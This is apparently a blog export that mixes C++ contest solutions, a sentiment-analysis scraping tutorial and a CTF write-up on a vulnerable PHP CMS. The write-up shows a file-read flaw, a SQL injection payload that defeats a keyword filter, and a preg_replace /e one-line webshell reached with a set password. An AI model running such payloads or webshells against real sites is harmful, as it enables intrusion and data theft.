	<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>



<h2 id="部分和"><a href="#部分和" class="headerlink" title="部分和"></a>部分和</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p>
<h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p>
<p><em>1*</em>≤<strong>N</strong>≤*<em>20</em>，输入整数及k均小于<em>1e8</em>。</p>
<h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>若可以使得和为k，输出”Yes”,否则”No”。</p>
<h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-number">4</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span>
<span class="hljs-number">13</span></code></pre>

<h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs ebnf"><span class="hljs-attribute">Yes</span></code></pre>

<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> s[<span class="hljs-number">25</span>];
<span class="hljs-keyword">int</span> n,m;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> a)</span></span>
<span class="hljs-function"></span>&#123;
	 <span class="hljs-keyword">if</span>(a==m) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(l==n) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	 <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a+s[l]))
	 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-built_in">cin</span>&gt;&gt;s[i];
	&#125;
	<span class="hljs-built_in">cin</span>&gt;&gt;m;
	<span class="hljs-keyword">if</span>(check(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;YES&quot;</span>;
	<span class="hljs-keyword">else</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>; 
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

]]></content>
      <categories>
        <category>c++</category>
      </categories>
  </entry>
  <entry>
    <title>综合2</title>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    <content><![CDATA[<h1 id="NCTF-综合2"><a href="#NCTF-综合2" class="headerlink" title="NCTF-综合2"></a>NCTF-综合2</h1><span id="more"></span>

<p>进入页面，没什么特别的地方，随便点点</p>
<p><img src="https://i.loli.net/2020/11/30/9Vf7JA3OWC68arb.png" alt></p>
<p>留言可以正常提交，本以为有xss,但是已经提示不是xss</p>
<p>看到最下面有个网站说明   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt">本CMS说明</a>  ，有用的内容如下</p>
<blockquote>
<p>config.php：存放数据库信息，移植此CMS时要修改 </p>
<p>index.php：主页文件 </p>
<p>passencode.php：Funny公司自写密码加密算法库 </p>
<p>say.php：用于接收和处理用户留言请求 </p>
<p>sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索</p>
<p>admin表结构 create table admin ( id integer, username text, userpass text, )  </p>
</blockquote>
<p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>可以使用php伪协议任意读取文件内容。 包括自己</p>
<p>尝试读取index.php的源码，发现好像并没有什么用</p>
<p>读取<code>about.php</code></p>
<pre><code class="hljs php+HTML">
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;

&lt;?php
$file&#x3D;$_GET[&#39;file&#39;];
if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; 有config.php
	echo &quot;file参数不能为空！&quot;;
	exit();
&#125;else&#123;
	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;包含了 loginxlcteam页面
	if($cut&#x3D;&#x3D;false)&#123;
	$data&#x3D;file_get_contents($file);
	$date&#x3D;htmlspecialchars($data);
	echo $date;
	&#125;else&#123;
		echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;;
	&#125;
&#125;</code></pre>

<p>读取config.php，无有用信息</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" alt></p>
<p>查看<code>loginxlcteam</code>,是个登录页面</p>
<p><img src="https://i.loli.net/2020/12/04/LfWepcHgMhxl8AF.png" alt></p>
<p>到此还是无从下手，参考大佬的博客 <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
<p>在搜索页面中也存在有用信息</p>
<p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>获取源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]!=<span class="hljs-string">&quot;Xlcteam Browser&quot;</span>)&#123; 
    <span class="hljs-comment">//必须修改http头，吧user-agent改成Xlcteam Browser</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&#x27;</span>;
    <span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;soid&#x27;</span>];				<span class="hljs-comment">//post 一个soid</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;antiinject.php&#x27;</span>;   <span class="hljs-comment">//防注入的文件</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;antixss.php&#x27;</span>;      <span class="hljs-comment">//防xss的文件		</span>
<span class="hljs-variable">$id</span>=antiinject(<span class="hljs-variable">$id</span>);		<span class="hljs-comment">//对id过滤</span>
<span class="hljs-variable">$con</span> = mysql_connect(<span class="hljs-variable">$db_address</span>,<span class="hljs-variable">$db_user</span>,<span class="hljs-variable">$db_pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不能连接到数据库！！&quot;</span>.mysql_error());
mysql_select_db(<span class="hljs-variable">$db_name</span>,<span class="hljs-variable">$con</span>);
<span class="hljs-variable">$id</span>=mysql_real_escape_string(<span class="hljs-variable">$id</span>);
<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-string">&quot;SELECT * FROM `message` WHERE display=1 AND id=<span class="hljs-subst">$id</span>&quot;</span>);  <span class="hljs-comment">//sql查询，可能存在注入点</span>
<span class="hljs-variable">$rs</span>=mysql_fetch_array(<span class="hljs-variable">$result</span>);
<span class="hljs-keyword">echo</span> htmlspecialchars(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;nice&#x27;</span>]).<span class="hljs-string">&#x27;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#x27;</span>.antixss(<span class="hljs-variable">$rs</span>[<span class="hljs-string">&#x27;say&#x27;</span>]).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;
mysql_free_result(<span class="hljs-variable">$result</span>);
mysql_free_result(<span class="hljs-variable">$file</span>);
mysql_close(<span class="hljs-variable">$con</span>);
<span class="hljs-meta">?&gt;</span></code></pre>





<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">//antiinject.php源码</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span>
<span class="hljs-function"> </span>&#123; 
 	<span class="hljs-variable">$keyword</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;union&quot;</span>,<span class="hljs-string">&quot;and&quot;</span>,<span class="hljs-string">&quot;from&quot;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;char&quot;</span>,<span class="hljs-string">&quot;or&quot;</span>,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-string">&quot;master&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;order&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>); <span class="hljs-comment">//对一些sql注入时用到的关键词进行了过滤</span>
     <span class="hljs-variable">$info</span>=strtolower(<span class="hljs-variable">$content</span>); 
 	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=count(<span class="hljs-variable">$keyword</span>);<span class="hljs-variable">$i</span>++)
 	&#123; 
 		<span class="hljs-variable">$info</span>=str_replace(<span class="hljs-variable">$keyword</span>[<span class="hljs-variable">$i</span>], <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$info</span>); 
 	&#125; 
 <span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>; 
 &#125; 
 <span class="hljs-meta">?&gt;</span></code></pre>

<p>大致意思就是</p>
<p>1.判断http请求头中的user-agent参数是否为Xlcteam Browser</p>
<p>2.post参数soid</p>
<p>3.对soid进行过滤后带入sql语句中查询</p>
<p>于是抓包修改user-agent</p>
<p>确定存在注入点</p>
<p><img src="https://i.loli.net/2020/11/30/KGcINOm5XAxVhDE.png" alt></p>
<p>由于之前提示了<strong>admin表结构 create table admin ( id integer, username text, userpass text, )</strong>  </p>
<p>可直接写出查询语句</p>
<pre><code class="hljs awk">(sselectelect<span class="hljs-regexp">/**/g</span>roup_concat(userppassass)<span class="hljs-regexp">/**/</span>ffromrom<span class="hljs-regexp">/**/</span>aadmindmin)</code></pre>

<p><img src="https://i.loli.net/2020/11/30/wMtHrAcuYVWOn91.png" alt></p>
<p>ASCII码转字符串结果为： fuckruntu </p>
<p>登录</p>
<p><img src="https://i.loli.net/2020/11/30/qZmL6EeW8O3MsYX.png" alt></p>
<p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  查看源码</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
<span class="hljs-variable">$e</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;www&#x27;</span>]; 
<span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;wtf&#x27;</span>] =&gt; <span class="hljs-string">&#x27;|.*|e&#x27;</span>,); 
array_walk(<span class="hljs-variable">$arr</span>, <span class="hljs-variable">$e</span>, <span class="hljs-string">&#x27;&#x27;</span>); 
<span class="hljs-meta">?&gt;</span></code></pre>

<p>看样子是可以用菜刀连接的</p>
<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a href="https://www.jb51.net/article/38714.htm">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
<p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
<p>密码：wtf</p>
<p><strong>总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！</strong></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>php</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>迷宫问题</title>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><span id="more"></span>

<h2 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h2><p>题目描述</p>
<p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br> 小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br> 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br> 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br> 字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br> 输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code>1
5 5
s-###
-----
##---
E#---
---##</code></pre><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code>9</code></pre><h2 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>,intP;  //坐标
<span class="hljs-keyword">int</span> to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;;  //在当前坐标下能走的四个方向
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  //(sx,sy)为起点坐标  （ex,ey）为终点坐标
<span class="hljs-keyword">int</span> x,y,nx,ny; //(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 
<span class="hljs-keyword">int</span> r,l;  //r为行数 l为列数 
<span class="hljs-keyword">int</span> bfs()
&#123;
	<span class="hljs-built_in">memset</span>(de,-1,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;Pqu;
	qu.push(P(sx,sy));   //将起点坐标放入队头 
	de[sx][sy]=0;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   //取出队头坐标 
		qu.pop() ;//删除对头及走过的坐标 
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; //到达终点 跳出循环		
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=0;i&lt;4;i++)
		&#123;
			nx=x+to[0][i];//开始向四个方向移动 
			ny=y+to[1][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">&#x27;#&#x27;</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 <span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 &#123;
	 	 qu.push(P(nx,ny));  <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
						 de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
					  &#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">&#x27;E&#x27;</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title>商品评价情感分析</title>
    <url>/2021/08/06/maliciousUrls/</url>
    <content><![CDATA[<h1 id="项目综述"><a href="#项目综述" class="headerlink" title="项目综述"></a>项目综述</h1><ul>
<li><p>对给定的文本进行自动分类，对评价分成好评和差评</p>
</li>
<li><p>支持批量检测，并进行可视化展示</p>
</li>
<li><p>对所有评价进行词云展示</p>
</li>
</ul>
<h1 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h1><p>爬虫获取JD的商品评价，这里主要针对智能手机的评价</p>
<ul>
<li><p>首先是分析如何获取到商品的评价</p>
</li>
<li><p>对商品评价进行提取</p>
</li>
<li><p>对获取的数据进行分类保存</p>
</li>
</ul>
<h2 id="获取评价"><a href="#获取评价" class="headerlink" title="获取评价"></a>获取评价</h2><p>首先进行搜索，比如关键词 为手机</p>
<pre><code class="hljs ini"><span class="hljs-attr">self.startUrl</span> = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%s&amp;enc=utf-8&quot;</span> % (quote(<span class="hljs-string">&#x27;手机&#x27;</span>))  <span class="hljs-comment"># jD起始搜索页面</span></code></pre>

<p>之后获取商品的ID，可以在网页源码中提取<code>//li[@class=&quot;gl-item&quot;]/@data-sku</code>，具体的节点信息如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164810298.png" alt="image-20210807164810298"></p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164417239.png" alt="image-20210807164417239" style="zoom:80%;">

<p>获得商品ID后可以利用JD提供的评价API获取评论页面，如图</p>
<p>api接口如下</p>
<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://sclub.jd.com/comment/productPageComments.action?productId=<span class="hljs-number">100020210392</span>&amp;score=<span class="hljs-number">3</span>&amp;sortType=<span class="hljs-number">5</span>&amp;page=<span class="hljs-number">2</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;isShadowSku=<span class="hljs-number">0</span>&amp;rid=<span class="hljs-number">0</span>&amp;fold=<span class="hljs-number">1</span></code></pre>

<p>其中需要改变的参数为</p>
<ul>
<li><p>productId  商品ID</p>
</li>
<li><p>score 评论的分类 1为差评 2为中评 3为好评</p>
</li>
<li><p>page 评论的页数</p>
</li>
</ul>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807164923145.png" alt="image-20210807164923145" style="zoom:80%;">

<p>获取这个页面后就是对数据进行提取</p>
<h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><blockquote>
<p> 这里为了方便，先将提取到的数据保存在csv文件中，之后再写入到数据库中</p>
</blockquote>
<p>上图中我们需要提取的数据只有评价部分的内容和打分数，也就是，content和socore的数据</p>
<p>这里可以将网页数据转换成json数据后提取，很方便</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210807165659199.png" alt="image-20210807165659199" style="zoom:80%;">

<pre><code class="hljs python">res_json = json.loads(response.text)
<span class="hljs-keyword">for</span> cdit <span class="hljs-keyword">in</span> res_json[<span class="hljs-string">&#x27;comments&#x27;</span>]:
	<span class="hljs-comment"># comment = cdit[&#x27;content &#x27;].replace(&quot;\n&quot;, &#x27; &#x27;)</span>
	comment = cdit[<span class="hljs-string">&#x27;content&#x27;</span>].replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)
	comments.append(comment)
	scores.append(cdit[<span class="hljs-string">&#x27;score&#x27;</span>])
	print(comment)</code></pre>

<h2 id="数据保存"><a href="#数据保存" class="headerlink" title="数据保存"></a>数据保存</h2><pre><code class="hljs python">savepath = <span class="hljs-string">&#x27;./&#x27;</span> + self.categlory + <span class="hljs-string">&#x27;_&#x27;</span> + self.comtype[score] + <span class="hljs-string">&#x27;.csv&#x27;</span>
logging.warning(<span class="hljs-string">&quot;已爬取%d 条 %s 评价信息&quot;</span> % (<span class="hljs-built_in">len</span>(comments), self.comtype[score]))
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(savepath, <span class="hljs-string">&#x27;a+&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(comments)):
	    f.write(<span class="hljs-string">&quot;%d\t%s\t%s\n&quot;</span> % (i, scores[i], comments[i]))
logging.warning(<span class="hljs-string">&quot;数据已保存在 %s&quot;</span> % (savepath))</code></pre>

<h1 id="贝叶斯分类"><a href="#贝叶斯分类" class="headerlink" title="贝叶斯分类"></a>贝叶斯分类</h1><blockquote>
<p>1.加载语料，打乱语料顺序，将语料分为评论和好评/差评<br>2.去除评论中的英文、停用词<br>3.将全部语料按1:4分为测试集与训练集<br>4.使用CountVectorize构造词袋模型<br>5.使用TfidfTransformer计算tf-idf值作为特征                                                                                                                                                6.选择多个分类器进行分类(也可以只用一个，这里只用了多项式)<br>7.选择合适的模型并保存</p>
</blockquote>
<h2 id="加载语料"><a href="#加载语料" class="headerlink" title="加载语料"></a>加载语料</h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_corpus</span>(<span class="hljs-params">file_path_pos,file_path_nag</span>):</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path_pos, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
        reader = csv.reader(f)
        rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path_nag, <span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
        reader = csv.reader(f)
        rows_2 = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
    rows.extend(rows_2)
    <span class="hljs-comment"># 将读取出来的语料转为list</span>
    review_data = np.array(rows).tolist()
    <span class="hljs-comment"># 打乱语料的顺序</span>
    random.shuffle(review_data)
    review_list = []
    sentiment_list = []
    <span class="hljs-comment"># 第一列为差评/好评， 第二列为评论</span>
    <span class="hljs-keyword">for</span> words <span class="hljs-keyword">in</span> review_data:
        review_list.append(words[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\t&quot;</span>)[<span class="hljs-number">2</span>])
        <span class="hljs-keyword">if</span>(words[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\t&quot;</span>)[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;5&#x27;</span>):
            sentiment_list.append(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">else</span>:
            sentiment_list.append(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">return</span> review_list, sentiment_list</code></pre>

<p>生成的数据如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808144639597.png" alt="image-20210808144639597"></p>
<h2 id="去除评论中的英文、停用词"><a href="#去除评论中的英文、停用词" class="headerlink" title="去除评论中的英文、停用词"></a>去除评论中的英文、停用词</h2><p>这一步的目的是方便后面的词频统计</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_stopwords</span>(<span class="hljs-params">file_path</span>):</span>  <span class="hljs-comment"># 加载停顿词</span>
    stop_words = []
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> words:
       stop_words.extend([i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> words.readlines()])
    <span class="hljs-keyword">return</span> stop_words


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">review_to_text</span>(<span class="hljs-params">review</span>):</span>
    stop_words = load_stopwords(stopword_path)
    <span class="hljs-comment"># 去除英文</span>
    review = re.sub(<span class="hljs-string">&quot;[^\u4e00-\u9fa5^a-z^A-Z]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, review)
    <span class="hljs-comment"># print(review)</span>
    review = jieba.cut(review)
    <span class="hljs-comment"># 去掉停用词，将句子划分成一个个的单词 例如：[&#x27;赞赞赞&#x27;, &#x27;不错&#x27;, &#x27;很漂亮&#x27;, &#x27;外壳&#x27;]</span>
    words = []
    <span class="hljs-keyword">if</span> stop_words:
        all_stop_words = <span class="hljs-built_in">set</span>(stop_words)
        words = [w <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> review <span class="hljs-keyword">if</span> w <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> all_stop_words]
    print(words[:<span class="hljs-number">4</span>])
    <span class="hljs-keyword">return</span> words</code></pre>

<p>最后经过处理</p>
<pre><code class="hljs python">review_train = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> train_review_list]
